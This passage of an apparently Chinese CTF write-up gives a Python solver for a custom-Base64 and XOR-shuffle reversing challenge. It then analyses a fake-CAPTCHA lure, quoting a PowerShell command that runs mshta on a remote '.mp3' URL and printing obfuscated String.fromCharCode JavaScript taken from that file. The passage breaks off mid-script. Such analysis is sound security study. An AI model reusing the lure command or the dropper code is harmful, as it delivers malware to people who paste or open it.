class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============ 自定义 Base64 映射表 ============</span></span><br><span class="line">CUSTOM_B64 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============ 密文 ============</span></span><br><span class="line">TARGET_B64 = <span class="string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span></span><br><span class="line"></span><br><span class="line">T0 = [<span class="number">0xD</span>, <span class="number">0xE</span>, <span class="number">0xF</span>, <span class="number">0xC</span>, <span class="number">0xB</span>, <span class="number">0xA</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">x, n</span>):</span><br><span class="line">    x &amp;= <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror</span>(<span class="params">x, n</span>):</span><br><span class="line">    x &amp;= <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64_decode_with_custom_table</span>(<span class="params">s: <span class="built_in">str</span>, custom_table: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把自定义 Base64 字符串映射回标准表后用标准库解码。&quot;&quot;&quot;</span></span><br><span class="line">    std_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="comment"># 建立自定义-&gt;标准的字符映射</span></span><br><span class="line">    trans = <span class="built_in">str</span>.maketrans(custom_table, std_table)</span><br><span class="line">    std_s = s.translate(trans)</span><br><span class="line">    <span class="comment"># 填充处理：标准库需要长度是 4 的倍数</span></span><br><span class="line">    pad = (-<span class="built_in">len</span>(std_s)) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> pad:</span><br><span class="line">        std_s += <span class="string">&quot;=&quot;</span> * pad</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(std_s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆 Step2：逆掉每 3 字节一组的位旋转</span></span><br><span class="line"><span class="comment"># 正向：b0 = ROR5(b0), b1 = ROR1(b1), b2 = b2</span></span><br><span class="line"><span class="comment"># 逆向：b0 = ROL5(b0), b1 = ROL1(b1), b2 = b2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_bit_rotations</span>(<span class="params">buf48: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(buf48) != <span class="number">48</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;期望 48 字节，得到 <span class="subst">&#123;<span class="built_in">len</span>(buf48)&#125;</span>&quot;</span>)</span><br><span class="line">    b = <span class="built_in">bytearray</span>(buf48)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">3</span>):</span><br><span class="line">        b[j]     = rol(b[j], <span class="number">5</span>)</span><br><span class="line">        b[j + <span class="number">1</span>] = rol(b[j + <span class="number">1</span>], <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># b[j + 2] 不变</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆 Step1：逆掉“洗牌 + XOR”</span></span><br><span class="line"><span class="comment"># 正向（每块 16 字节）： y[j] = x[ t[j] ] ^ t[j]</span></span><br><span class="line"><span class="comment"># 逆向：先 z = y ^ t，然后 x[k] = z[ inv_t[k] ]，其中 inv_t 满足 t[inv_t[k]] = k</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_block</span>(<span class="params">y_block: <span class="built_in">bytes</span>, t_index: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(y_block) == <span class="number">16</span> <span class="keyword">and</span> <span class="built_in">len</span>(t_index) == <span class="number">16</span></span><br><span class="line">    <span class="comment"># z = y ^ t</span></span><br><span class="line">    z = [ y_block[i] ^ (t_index[i] &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>) ]</span><br><span class="line">    <span class="comment"># 构造 inv_t</span></span><br><span class="line">    inv_t = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> j, idx <span class="keyword">in</span> <span class="built_in">enumerate</span>(t_index):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= idx &lt; <span class="number">16</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;t 内应全为 0..15 的索引字节&quot;</span>)</span><br><span class="line">        inv_t[idx] = j</span><br><span class="line">    <span class="comment"># 还原 x</span></span><br><span class="line">    x = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        x[k] = z[ inv_t[k] ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_table_with_byte</span>(<span class="params">tbl: <span class="built_in">list</span>[<span class="built_in">int</span>], val: <span class="built_in">int</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [ (b ^ (val &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> tbl ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_plain_from_target</span>():</span><br><span class="line">    <span class="comment"># 1) 自定义 Base64 解码 -&gt; 48 字节</span></span><br><span class="line">    enc = b64_decode_with_custom_table(TARGET_B64, CUSTOM_B64)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(enc) != <span class="number">48</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;自定义 Base64 解码后不是 48 字节，而是 <span class="subst">&#123;<span class="built_in">len</span>(enc)&#125;</span>，请检查密文/表是否正确。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) 逆掉位旋转（对应源码的第二步）</span></span><br><span class="line">    after_unrotate = invert_bit_rotations(enc)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3) 逆第一步（NEON 洗牌 + XOR），注意 t 的演化：</span></span><br><span class="line">    <span class="comment"># 源码 for i=0..2:</span></span><br><span class="line">    <span class="comment">#   y_i = shuffle(x_i, t) ^ t</span></span><br><span class="line">    <span class="comment">#   t ^= dup(i)   // 每个字节都异或 i</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 因为 t 在“完成当前块后”才更新，所以三个块用到的 t 分别是：</span></span><br><span class="line">    <span class="comment">#   块0: t0</span></span><br><span class="line">    <span class="comment">#   块1: t0</span></span><br><span class="line">    <span class="comment">#   块2: t0 ^ 0x01</span></span><br><span class="line">    blocks = [after_unrotate[i*<span class="number">16</span>:(i+<span class="number">1</span>)*<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sorted</span>(T0) != <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>)):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;T0 必须是 0..15 的置换（每个值恰好出现一次）。请从 ELF 符号 t 正确抄值。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    t_blk0 = T0</span><br><span class="line">    t_blk1 = T0</span><br><span class="line">    t_blk2 = xor_table_with_byte(T0, <span class="number">0x01</span>)</span><br><span class="line"></span><br><span class="line">    x0 = invert_block(blocks[<span class="number">0</span>], t_blk0)</span><br><span class="line">    x1 = invert_block(blocks[<span class="number">1</span>], t_blk1)</span><br><span class="line">    x2 = invert_block(blocks[<span class="number">2</span>], t_blk2)</span><br><span class="line"></span><br><span class="line">    plain = x0 + x1 + x2</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plain = recover_plain_from_target()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recovered bytes (hex):&quot;</span>, plain.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Recovered as UTF-8 :&quot;</span>, plain.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Recovered is not valid UTF-8; raw bytes printed above.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1’M-no7-A-rO6oT"><a href="#1’M-no7-A-rO6oT" class="headerlink" title="1’M no7 A rO6oT"></a>1’M no7 A rO6oT</h2><p>很有趣的恶意脚本分析</p><p>打开靶机按一下发现复制以下内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell . \*i*\\\\\\\\\\\\\\\*<span class="number">2</span>\msh*e http://challenge.xinshi.fun:<span class="number">49037</span>/Coloringoutomic_Host.mp3   http://challenge.xinshi.fun:<span class="number">49037</span>/Coloringoutomic_Host.mp3 <span class="comment">#     ✅ Ι am nοt a rοbοt: CAPTCHA Verification ID: 10086</span></span><br></pre></td></tr></table></figure><p>在<a href="http://challenge.xinshi.fun:49037/Coloringoutomic_Host.mp3%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8F%91%E7%8E%B0%E4%B8%80%E6%AE%B5js%E4%BB%A3%E7%A0%81">http://challenge.xinshi.fun:49037/Coloringoutomic_Host.mp3文件中发现一段js代码</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">resizeTo</span>(<span class="number">0</span>, <span class="number">0</span>);<span class="variable language_">window</span>.<span class="title function_">moveTo</span>(-<span class="number">9999</span>, -<span class="number">9999</span>); <span class="variable constant_">SK</span>=<span class="number">102</span>;<span class="variable constant_">UP</span>=<span class="number">117</span>;tV=<span class="number">110</span>;<span class="title class_">Fx</span>=<span class="number">99</span>;nI=<span class="number">116</span>;pV=<span class="number">105</span>;wt=<span class="number">111</span>;<span class="variable constant_">RV</span>=<span class="number">32</span>;wV=<span class="number">82</span>;<span class="title class_">Rp</span>=<span class="number">106</span>;kz=<span class="number">81</span>;<span class="variable constant_">CX</span>=<span class="number">78</span>;<span class="variable constant_">GH</span>=<span class="number">40</span>;<span class="variable constant_">PS</span>=<span class="number">70</span>;<span class="variable constant_">YO</span>=<span class="number">86</span>;kF=<span class="number">75</span>;<span class="variable constant_">PO</span>=<span class="number">113</span>;<span class="variable constant_">QF</span>=<span class="number">41</span>;sZ=<span class="number">123</span>;nd=<span class="number">118</span>;<span class="title class_">Ge</span>=<span class="number">97</span>;sV=<span class="number">114</span>;wl=<span class="number">104</span>;<span class="variable constant_">NL</span>=<span class="number">121</span>;<span class="title class_">Ep</span>=<span class="number">76</span>;uS=<span class="number">98</span>;<span class="title class_">Lj</span>=<span class="number">103</span>;<span class="variable constant_">ST</span>=<span class="number">61</span>;<span class="title class_">Ix</span>=<span class="number">34</span>;<span class="title class_">Im</span>=<span class="number">59</span>;<span class="title class_">Gm</span>=<span class="number">101</span>;<span class="variable constant_">YZ</span>=<span class="number">109</span>;<span class="title class_">Xj</span>=<span class="number">71</span>;<span class="title class_">Fi</span>=<span class="number">48</span>;dL=<span class="number">60</span>;cX=<span class="number">46</span>;ho=<span class="number">108</span>;jF=<span class="number">43</span>;<span class="title class_">Gg</span>=<span class="number">100</span>;aV=<span class="number">90</span>;uD=<span class="number">67</span>;<span class="title class_">Nj</span>=<span class="number">83</span>;<span class="variable constant_">US</span>=<span class="number">91</span>;tg=<span class="number">93</span>;vx=<span class="number">45</span>;xv=<span class="number">54</span>;<span class="variable constant_">QB</span>=<span class="number">49</span>;<span class="variable constant_">WT</span>=<span class="number">125</span>;<span class="variable constant_">FT</span>=<span class="number">55</span>;yN=<span class="number">51</span>;ff=<span class="number">44</span>;it=<span class="number">50</span>;<span class="variable constant_">NW</span>=<span class="number">53</span>;kX=<span class="number">57</span>;zN=<span class="number">52</span>;<span class="title class_">Mb</span>=<span class="number">56</span>;<span class="title class_">Wn</span>=<span class="number">119</span>;sC=<span class="number">65</span>;<span class="title class_">Yp</span>=<span class="number">88</span>;<span class="variable constant_">FF</span>=<span class="number">79</span>;<span class="keyword">var</span> <span class="title class_">SxhM</span> = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="variable constant_">SK</span>,<span class="variable constant_">UP</span>,tV,<span class="title class_">Fx</span>,nI,pV,wt,tV,<span class="variable constant_">RV</span>,pV,wt,wV,<span class="title class_">Rp</span>,kz,<span class="variable constant_">CX</span>,<span class="variable constant_">GH</span>,<span class="variable constant_">PS</span>,<span class="variable constant_">YO</span>,kF,<span class="variable constant_">PO</span>,<span class="variable constant_">QF</span>,sZ,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,<span class="title class_">Ix</span>,<span class="title class_">Ix</span>,<span class="title class_">Im</span>,<span class="variable constant_">SK</span>,wt,sV,<span class="variable constant_">RV</span>,<span class="variable constant_">GH</span>,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,<span class="title class_">Fi</span>,<span class="title class_">Im</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,<span class="variable constant_">RV</span>,dL,<span class="variable constant_">RV</span>,<span class="variable constant_">PS</span>,<span class="variable constant_">YO</span>,kF,<span class="variable constant_">PO</span>,cX,ho,<span class="title class_">Gm</span>,tV,<span class="title class_">Lj</span>,nI,wl,<span class="title class_">Im</span>,<span class="variable constant_">RV</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,jF,jF,<span class="variable constant_">QF</span>,sZ,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,tV,<span class="title class_">Gg</span>,aV,uD,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,<span class="title class_">Nj</span>,nI,sV,pV,tV,<span class="title class_">Lj</span>,cX,<span class="variable constant_">SK</span>,sV,wt,<span class="variable constant_">YZ</span>,uD,wl,<span class="title class_">Ge</span>,sV,uD,wt,<span class="title class_">Gg</span>,<span class="title class_">Gm</span>,<span class="variable constant_">GH</span>,<span class="variable constant_">PS</span>,<span class="variable constant_">YO</span>,kF,<span class="variable constant_">PO</span>,<span class="variable constant_">US</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,tg,<span class="variable constant_">RV</span>,vx,<span class="variable constant_">RV</span>,xv,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">QF</span>,<span class="title class_">Im</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">RV</span>,jF,<span class="variable constant_">RV</span>,tV,<span class="title class_">Gg</span>,aV,uD,<span class="variable constant_">WT</span>,sV,<span class="title class_">Gm</span>,nI,<span class="variable constant_">UP</span>,sV,tV,<span class="variable constant_">RV</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">WT</span>,<span class="title class_">Im</span>,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,pV,wt,wV,<span class="title class_">Rp</span>,kz,<span class="variable constant_">CX</span>,<span class="variable constant_">GH</span>,<span class="variable constant_">US</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,yN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,kX,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,zN,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,zN,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,yN,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,<span class="title class_">Mb</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,zN,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,yN,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,yN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="title class_">Mb</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,xv,it,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,zN,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,xv,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,yN,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,it,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">FT</span>,ff,<span 